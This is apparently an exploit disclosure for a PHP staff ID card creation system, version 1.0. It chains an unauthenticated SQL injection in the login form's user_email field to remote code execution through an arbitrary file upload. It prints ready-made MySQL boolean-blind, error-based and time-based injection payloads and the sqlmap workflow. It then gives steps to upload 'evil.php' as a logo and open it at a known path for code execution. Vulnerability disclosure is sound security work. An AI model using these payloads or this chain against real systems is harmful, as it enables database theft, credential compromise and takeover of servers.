# Exploit Author : bwnz
# Software Link: https://www.sourcecodester.com/php/12802/php-staff-id-card-creation-and-printing-system.html
# Version: 1.0
# Tested on: Ubuntu 20.04.2 LTS

# Printable Staff ID Card Creator System is vulnerable to an unauthenticated SQL Injection attack.
# After compromising the database via SQLi, an attacker can log in and leverage an arbitrary file upload
# vulnerability to obtain remote code execution.


-----SQL Injection-----
Step 1.) Navigate to the login page and populate the email and password fields.
Step 2.) With Burp Suite running, send and capture the request.
Step 3.) Within Burp Suite, right click and "Save item" in preparation for putting the request through SQLMap.
Step 4.) Open a terminal and run the following command:
	sqlmap -r <saved item>

Below are the SQLMap results

Parameter: user_email (POST)
   	 Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: user_email=test@test.com' RLIKE (SELECT (CASE WHEN (9007=9007) THEN 0x7465737440746573742e636f6d ELSE 0x28 END))-- JaaE&password=`&login_button=

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user_email=test@test.com' AND (SELECT 7267 FROM(SELECT COUNT(*),CONCAT(0x7176717071,(SELECT (ELT(7267=7267,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- pCej&password=`&login_button=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user_email=test@test.com' AND (SELECT 2884 FROM (SELECT(SLEEP(5)))KezZ)-- bBqz&password=`&login_button=

----- Authenticated RCE via Arbitrary File Upload -----
# For this attack,  it is assumed that you've obtained credentials via the SQL Injection attack above and have logged in.

Step 1.) After logging in, click the "Initialization" option and "Add System Info".
Step 2.) Populate the blank form with arbitrary data. At the bottom of the form, there is an option to upload a logo. Upload your evil.php file here and click "Finish".
Step 3.) By default, the file is uploaded to http://<IP>/Staff_registration/media/evil.php. Navigate to it for RCE.
